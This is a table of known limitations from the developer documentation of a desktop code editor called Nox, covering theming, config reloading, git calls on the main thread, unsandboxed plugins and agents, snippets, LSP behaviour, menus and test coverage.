| A theme cannot set a shadow or the focus ring's geometry | `--nox-shadow-md`, `--nox-shadow-lg` and `--nox-focus-ring` are composite `box-shadow` values, so they would need a grammar of their own rather than the colour check every other token gets. `--nox-focus-ring-color` *is* themeable, which covers the case anyone actually wants. A theme on a light ground would want the shadows and cannot have them. |
| Four config files still need a Reload command | The config directory is watched since 2026-08-28, and `snippets.json`, `plugin-settings.json` and a theme file all reload on an outside edit. `settings.json` and `keybindings.json` are **deliberately** absent: Nox writes both constantly, and live-reloading the layer that owns every preference wants its own envelope read rather than riding in on this one. `servers.json` and `agents.json` are absent because reloading them *restarts processes*, which is a decision a user makes. That is what **Reload Language Servers** is. `classifyConfigChange` is where that list lives, and a test pins the omissions so adding a file to the folder cannot silently start reloading it. |
| The two older git reads still run on the main thread | `nox_git_file_base` and `nox_git_status` are plain `#[tauri::command]`, so their bodies run inline on the thread that handles the IPC message and draws the window. `git.rs`'s module comment argues no caller can be blocked because "every caller is async". True of the *renderer*, and beside the point for the *main thread*, which is the thing a blocking body holds. In practice neither is slow: one blob, one index scan. `git status` on a very large repository with a cold cache is the case that would be felt, and it is a `#[tauri::command(async)]` away. Deliberately not taken here, because it is a change to two shipped commands with no failure to point at, and this change already carries one command's worth of new argument. Found while building blame, by reading the macro rather than trusting the comment. |
| The packaged app is verified, but not its native chrome | Three walks on 2026-08-29 covered the packaged Windows build: behaviour from disk (a command's effect on `settings.json`, a plugin's own log, warnings in `diagnostics.log`) and then appearance, by opening the WebView's debugging endpoint and screenshotting it: a custom theme painting, the Plugins tab and its controls, a plugin's status item and panel rows, the settings loop repainting, and a theme edited outside the editor repainting a running window. What no walk has yet driven is the part *outside* the WebView: the menu bar, native dialogs, the terminal, a real git repository. Those are the `nox-desktop-walk` checklist's own rows, and they need the desktop rather than the renderer. See `.desktop-pass-report.md`. |
| A plugin process is not sandboxed | The same line `agents` already carries: the permission model governs what a plugin may ask *Nox* to do, not what its own process can reach. A plugin is trusted code you chose to install, like a shell plugin. The difference from an agent is only that more people will install one. |
| A snippet's choice syntax keeps only its first option | `${1|const,let|}` becomes `${1:const}`. CodeMirror's snippet fields have no picker attached, so the alternatives have nowhere to be shown, and a field the user can type over beats a literal `|const,let|` in their code. Offering the real thing means a completion source that fires on entering the field. Buildable, and a bigger feature than the conversion it would sit inside. |
| Snippet variables are not substituted | `$TM_FILENAME`, `$CURRENT_YEAR` and the rest are left exactly as written. Resolving them is a table of a dozen names and a clock, and deleting them silently is worse than leaving them, so leaving them is what happens. Visible, and fixable by the person who wrote it. |
| Completions are insert mode only | A server's `textEdit` range may end after the caret, meaning "replace the word I am standing in the middle of". Nox applies the range's start and keeps its own end, so the tail of that word survives. Replace mode is gated in LSP behind `insertReplaceSupport`, which `session.ts` does not advertise, and insert mode is every editor's default, so this is a decision rather than an omission. Offering both needs the capability, the `InsertReplaceEdit` shape, and a preference. |
| Servers run their own file watchers | Nox advertises no dynamic registration at all, neither `workspace.didChangeWatchedFiles.dynamicRegistration` nor `synchronization.dynamicRegistration`, which is explicitly `false`, so a conforming server never sends `client/registerCapability` and falls back to watching files itself, which rust-analyzer and gopls both do. **That makes this conforming rather than broken**, and the mildest of the four items that waited on the server-request seam. The production-readiness plan's "they never get to" overstated it. What is lost is efficiency and consistency: N servers each running a watcher over the same tree, with their own ignore rules, rather than one `FileWatcherService` fanning out. Building it is a feature and not a handler: accept a registration, match its globs (`onPathsChanged` is already the right seam and `globToRegExp` already exists), derive created/changed/deleted, send `workspace/didChangeWatchedFiles`, honour `client/unregisterCapability`. And accepting a registration Nox would not honour is worse than never inviting one. |
| Scroll position is not persisted | Scroll is a view concern and not part of `EditorState`. On restore the cursor is scrolled into view instead, which covers the case people actually mean. |
| No charset is auto-detected beyond UTF-8 and BOM'd UTF-16 | Legacy charsets open and save correctly (§4) but must be *chosen*. Nothing detects windows-1252 or Shift_JIS, because nothing honestly can without a statistical guess. `chardetng` would let the picker arrive pre-selected rather than empty, and is the obvious next step. Project **replace** still skips non-UTF-8 files: `search.rs` reads them strictly, so a replace can never target one. |
| Grouped undo is bounded by CodeMirror's history depth | A change set old enough to have fallen out of a buffer's history cannot be undone as a group. The project-replace panel's journal covers that case for replace. Nothing else needs it yet. |
| The transaction log does not survive a restart | Deliberate: see §4. Undo history does not either, so a persisted log would list changes it could not undo. |
| Agent processes are not sandboxed | A configured agent runs with Nox's own privileges. The permission model governs what it may ask *Nox* to do, not what its own process can reach. A stdio agent is trusted code you chose to run, like a shell plugin. |
| No model provider ships | Deliberate: a default provider would be a vendor in the core. The Agents panel says so rather than offering an input that cannot work. |
| Splits do not nest | The layout is a flat row or column, not a tree, so you cannot have a column split inside a row. |
| macOS trash has no "Put Back" | Nox trashes via `NSFileManager` rather than Finder/AppleScript, because the AppleScript path blocks for two minutes and then fails when Finder is unavailable. A trashed file restores to the Trash folder, not its original location. Covered by `tests/fileops_integration.rs`. |
| Reloading the window drops in-memory agent state | Sessions and the transaction log do not survive **Reload Window**. Unsaved work does, because it is in the session. The reload also kills any running agent, which is the point: a renderer that no longer exists cannot talk to them. |
| Three grammars colour but do not parse | Shell, TOML and Ruby load `@codemirror/legacy-modes` through `StreamLanguage`, which tokenises line by line and builds no tree. They highlight correctly and **Go to Symbol, sticky scroll and syntax folding stay empty in them**, because all three read a parse tree. The palette says so in its own words rather than reporting the file as bare: `hasSymbolStructure` in `editor/languages.ts`, and `symbolListState`'s `no-structure`. No Lezer grammar exists for any of the three to upgrade to. `LOADERS` is the only place that would change. |
| No *native* menu off macOS | Windows and Linux now draw an in-window menu bar instead (§4), so every platform has a menu. What is still missing is a **native** one off macOS. Windows cannot host one, because `set_decorations(false)` removes the frame it lives in. A native GTK menu for Linux is possible but unbuilt: the accelerator argument in §4 is WKWebView's, never checked against WebKitGTK. `nox_set_menu` still returns `Ok(())` on both. |
| Native menu items are always drawn enabled | macOS only: greying them means pushing every state change across the IPC boundary to keep ~130 items in step. Enablement is re-checked when the item is chosen (`CommandRegistry.execute` refuses a disabled command), so nothing runs that should not, but a disabled item looks live and does nothing when clicked. The in-window bar (§4) has no such problem: the predicates are already in the renderer, so it greys them correctly. |
| The menu has no Close Window item | `PredefinedMenuItem::close_window` carries ⌘W and Nox binds ⌘W to `file.close`, so both in one menu would be two items claiming one accelerator. Nox has no `window.close` command to offer instead; the ways out are the traffic light (macOS), the drawn Close control in the title bar (Windows, where `capabilities.customWindowControls` holds), and ⌘Q or Alt+F4, which the Rust side handles through the same `CloseRequested` path. |
| `--geometry` suppresses geometry persistence for that launch | Deliberate (see §4) but it means a walk cannot be used to *set* a remembered window, and a malformed `--geometry` falls back to an ordinary launch that does persist. |
| Browser build does not persist edits | Deliberate: it is for developing the UI, not storing work. Settings and session do persist via localStorage. |
| Diagnostic redaction is case-sensitive | `redactHome` replaces the home directory with `~` on the way in, in both separator spellings, so `diagnostics.log` never holds the string that names the user. It matches exactly, so a path that reached Nox as `c:\users\ada` is not redacted when the home directory reports as `C:\Users\ada`. Bounded in the harmless direction and unreached in practice, since paths that get here come from the same OS APIs that produced the home directory, but a Windows path typed by hand into a config file could differ in case. A case-insensitive scan is the fix, and it is a scan rather than a `split`/`join`. |
| Components embedding CodeMirror are tested for wiring and text, not geometry | `EditorPane` mounts under jsdom (`tests/lsp-rendering.test.ts`, `tests/lsp-paint-target.test.ts`): a diagnostic paints under the text its range names, the picker lists what the server sent, the hover tooltip carries the server's markdown as text. jsdom has no layout, so a tooltip's placement and which symbol was under the pointer are not checkable. `tests/support/jsdom-layout.ts` fills `Range.getClientRects`, the one method CodeMirror needs to *run*, with a single all-zero rectangle whose numbers are jsdom's own and whose existence is the one invented fact, and says what that forbids a test from claiming. **A geometric claim now has somewhere to go**, which it did not when this row was written: the `editor` browser project is real chromium with real layout, and `tests/browser/blame-gutter.test.ts` is the first feature to use it that way, holding a gutter column to one width across a scroll. What stays true is that a *component* mounted under jsdom cannot make such a claim, so the question for a new feature is which of the two harnesses it belongs in. Of the corrected hover claim, "shows the server's markdown as text" is test-backed. "Stays while the pointer is over the span" is read from `@codemirror/view`'s `HoverPlugin` and cannot be driven under zero geometry. |
